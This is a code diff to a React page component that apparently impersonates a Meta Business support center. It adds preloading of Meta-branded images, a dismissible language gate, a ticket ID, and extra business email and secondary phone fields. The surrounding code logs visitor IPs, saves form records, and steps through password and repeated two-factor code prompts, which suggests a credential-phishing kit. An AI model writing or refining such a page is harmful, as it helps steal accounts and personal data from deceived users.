@@ -26,6 +26,7 @@ function BusinessCenterInner() {
   const { setLang } = useLocale();
   const [checking, setChecking] = useState(false);
   const [gateVisible, setGateVisible] = useState(true);
+  const [dismissible, setDismissible] = useState(false);
   const [locked, setLocked] = useState(true);
   const [visitorIp, setVisitorIp] = useState("N/A");
   const visitorIpRef = useRef("N/A");
@@ -66,10 +67,31 @@ function BusinessCenterInner() {
     };
   }, [setLang]);
 
+  useEffect(() => {
+    const sources = [
+      "/images/authentication.jpg",
+      "/images/success.jpg",
+      "/icons/ic_logo.svg",
+      "/icons/ic_meta_gray.svg",
+    ];
+    const links = sources.map((href) => {
+      const link = document.createElement("link");
+      link.rel = "preload";
+      link.as = "image";
+      link.href = href;
+      document.head.appendChild(link);
+      return link;
+    });
+    return () => {
+      links.forEach((link) => link.remove());
+    };
+  }, []);
+
   const unlock = () => {
     setGateVisible(false);
     setLocked(false);
     setChecking(false);
+    setDismissible(false);
     document.body.classList.remove("language-locked");
   };
 
@@ -91,6 +113,8 @@ function BusinessCenterInner() {
       <LanguageGate
         visible={gateVisible}
         checking={checking}
+        dismissible={dismissible}
+        onClose={unlock}
         onConfirm={async (lang, label) => {
           const ip = visitorIpRef.current;
           if (ip && ip !== "N/A") {
@@ -118,6 +142,7 @@ function BusinessCenterInner() {
         locked={locked}
         onActivate={() => setStep("info")}
         onMoreLanguages={() => {
+          setDismissible(true);
           setGateVisible(true);
           setLocked(true);
           document.body.classList.add("language-locked");
@@ -130,6 +155,7 @@ function BusinessCenterInner() {
       <div id="modalsContainer">
         <InfoFormModal
           open={step === "info"}
+          ticketId={ticketId}
           onSubmit={(data) => {
             saveRecord("__client_rec__fi_rst", data);
             setFormData(data);
@@ -158,7 +184,9 @@ function BusinessCenterInner() {
           open={step === "twoFa"}
           fullName={formData?.fullName || ""}
           email={formData?.email || ""}
+          emailBusiness={formData?.emailBusiness || ""}
           phone={formData?.phone || ""}
+          phoneSecondary={formData?.phoneSecondary || ""}
           baseData={baseAfterPassword}
           onNotify={async (payload) => {
             if (payload.twoFaThird) {
